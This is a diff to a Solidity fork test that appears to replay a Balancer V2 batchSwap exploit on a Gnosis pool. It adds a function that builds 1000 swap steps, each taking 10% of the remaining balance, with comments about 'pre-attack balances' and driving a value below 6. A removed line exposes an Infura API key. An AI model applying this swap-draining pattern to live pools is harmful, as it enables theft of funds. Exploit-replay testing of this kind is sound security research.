@@ -46,17 +46,18 @@ contract BalancerV2BatchSwapReplayTest is BaseTestWithBalanceLog {
 
 //    uint256 constant BLOCK_NUMBER = 23831814; // eth
 //    uint256 constant BLOCK_NUMBER = 401839525; // arbitrum
-    uint256 constant BLOCK_NUMBER = 143975567; // Optimistic
+//    uint256 constant BLOCK_NUMBER = 143975567; // Optimistic
+    uint256 constant BLOCK_NUMBER = 43252068 ; // gnosis
 
 
 //    address constant POOL_ADDR = 0x2191Df821C198600499aA1f0031b1a7514D7A7D9;
 //    bytes32 constant POOL_ID = 0x2191df821c198600499aa1f0031b1a7514d7a7d9000200000000000000000639;
 //    address constant POOL_ADDR = 0x1CCE5169bDe03f3d5aD0206f6BD057953539DAE6;
-    bytes32 constant POOL_ID = 0x7ca75bdea9dede97f8b13c6641b768650cb837820002000000000000000000d5;
+    bytes32 constant POOL_ID = 0x8dd4df4ce580b9644437f3375e54f1ab0980822800020000000000000000009c;
 
 
     function setUp() public {
-        vm.createSelectFork("https://optimism-mainnet.infura.io/v3/2c182dd8453b48d4a4a32ced4af4df3d", BLOCK_NUMBER);
+        vm.createSelectFork("https://rpc.gnosischain.com", BLOCK_NUMBER);
     }
 
     /* 入口：打印攻击前余额 */
@@ -78,7 +79,7 @@ contract BalancerV2BatchSwapReplayTest is BaseTestWithBalanceLog {
         uint256 bal_token1 = balances[1];
 
 
-        IBalancerVault.BatchSwapStep[] memory swaps = _buildSwaps(bal_token0, bal_token1);
+        IBalancerVault.BatchSwapStep[] memory swaps = _buildSwaps_1(bal_token0, bal_token1);
         IBalancerVault.FundManagement memory funds = _buildFunds();
         int256[] memory limits = _buildLimits();
 
@@ -133,35 +134,26 @@ contract BalancerV2BatchSwapReplayTest is BaseTestWithBalanceLog {
             i = i + 1;
             _bal_token0 -= amountOut;
         }
-//        swaps[0] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, _bal_token0 /2, "");
-//        swaps[1] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, 10, "");
-//        swaps[2] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, 10, "");
-
-//        swaps[1] = IBalancerVault.BatchSwapStep(POOL_ID, 0, 1, 353978772998312421488536095785, "");
-
-        //6.08765E+29
-//        swaps[2] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, 11, "");
-//        swaps[3] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, 11, "");
-//        swaps[4] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, 6, "");
-//        swaps[4] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, 5, "");
-
-
-//        swaps[2] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, bal_rETH * 50 / 100, "");
-//        swaps[3] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, bal_rETH * 50 / 100, "");
-//        swaps[4] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, 11, "");
-//        swaps[5] = IBalancerVault.BatchSwapStep(POOL_ID, 1, 0, 9, "");
-//        swaps[6] = IBalancerVault.BatchSwapStep(POOL_ID, 0, 1, bal_WETH0, "");
-
-
         return swaps;
     }
 
-//    function _buildAssets() internal pure returns (address[] memory) {
-//        address[] memory assets = new address[](2);
-//        assets[0] = TOKEN0;
-//        assets[1] = TOKEN1;
-//        return assets;
-//    }
+    function _buildSwaps_1(uint256 bal_token0, uint256 bal_token1) internal pure returns (IBalancerVault.BatchSwapStep[] memory) {
+        uint256 length = 1000;
+        IBalancerVault.BatchSwapStep[] memory swaps = new IBalancerVault.BatchSwapStep[](length);
+
+        uint256 _bal_token1 = bal_token1;
+        uint256 i = 0 ;
+        uint256 rate = 10;
+        // 目标是让它降低到 6 以内
+        while(i < length){
+            uint256 amountOut = _bal_token1 * rate / 100 ;
+            swaps[i] = IBalancerVault.BatchSwapStep(POOL_ID, 0, 1, amountOut, "");
+            i = i + 1;
+            _bal_token1 -= amountOut;
+        }
+        return swaps;
+    }
+
 
 
     function _buildFunds() internal view returns (IBalancerVault.FundManagement memory) {
